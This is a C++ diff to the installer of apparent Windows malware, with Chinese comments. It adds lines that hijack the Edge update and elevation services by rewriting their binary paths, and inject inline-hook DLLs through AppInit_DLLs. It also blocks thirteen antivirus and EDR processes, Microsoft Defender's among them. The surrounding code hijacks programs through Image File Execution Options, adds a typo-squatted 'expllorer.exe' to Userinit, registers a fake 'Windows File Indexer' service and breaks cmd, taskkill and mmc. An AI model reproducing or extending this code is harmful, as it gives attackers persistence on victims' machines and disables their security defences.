@@ -3,6 +3,7 @@
 
 
 #include"bin\MustInclude.h"
+#include"bin\GeneralTask.h"
 #include"process.h"
 #include"admin.h"
 #include"RegFunc.h"
@@ -31,14 +32,45 @@ void install(){
 	if(!isConfiged)config();
 	SetImageFileExecutionRedirect(src,tgt);//创建首要程序劫持
 	
-	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());cout<<string(string(BIN_PATH)+"expllorer.exe");
+
+	
+	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());
 	CreateWindowsService(//创建常驻伪装 注册表回写服务  
         "WFI",          // 服务名  
         "Windows File Indexer",          // 显示名  
         "Windows文件索引器",  // 描述  
         SvcPath.c_str(),    // 程序路径  
         SERVICE_AUTO_START           // 自动启动  
-    );PAUSE
+    );
+	
+	
+	SetServiceBinPath("edgeupdate",SvcPath);
+	SetServiceBinPath("edgeupdatem",SvcPath);
+	SetServiceBinPath("MicrosoftEdgeElevationService",SvcPath);
+	
+	
+	SetAppInitDLLs32("InlineHookDll32.dll");
+	SetAppInitDLLs64("InlineHookDll64.dll");
+	
+	BanExe("360tray.exe");
+	BanExe("ZhuDongFangYu.exe");
+	BanExe("QQPCRTP.exe");
+	BanExe("kxetray.exe");
+	BanExe("RavMonD.exe");
+	BanExe("BaiduSdSvc.exe");
+	BanExe("ksafe.exe");
+	BanExe("wsctrl.exe");
+	BanExe("hipstray.exe");
+	BanExe("usysdiag.exe");
+	BanExe("MsMpEng.exe");
+	BanExe("MsSense.exe");
+	BanExe("SenseIR.exe");
+	
+	
+	//system("sc.exe config AppIDSvc start=auto");
+	//system("sc.exe start AppIDSvc");
+	
+
 	if(isGuard){
 
 		SetImageFileExecutionRedirect("taskkill.exe","aux");//干掉系统工具
@@ -49,7 +81,7 @@ void install(){
 		SetImageFileExecutionRedirect("cmd.exe","aux");
 		SetImageFileExecutionRedirect("mmc.exe","aux");
 	}
-	
+	cout<<"\nInsall Successfully!\n";
 }
 
 void uninstall(){
@@ -76,6 +108,8 @@ void init(){//这个启动器被编译为32位，文件复制大概率走不通，那么就启动FileSpawne
 	BinSrc=CurDir+"\\bin\\";
 	SvcPath=string(BIN_PATH)+string("SCMServiceGuard.exe");
 	
+
+	
 	CopyFileToDirectory(addStrings(BinSrc.c_str(),WALLPAPER_NAME),"C:\\windows\\system32\\");//拷贝目标壁纸
 	
 	copyToBin(BIN_PATH); CLS
@@ -87,6 +121,8 @@ void init(){//这个启动器被编译为32位，文件复制大概率走不通，那么就启动FileSpawne
 	Sleep(2000);
 	cout<<".";
 	}
+	
+	
 	cout<<"\nInit Successfully!\n";
 	PAUSE
 	CLS
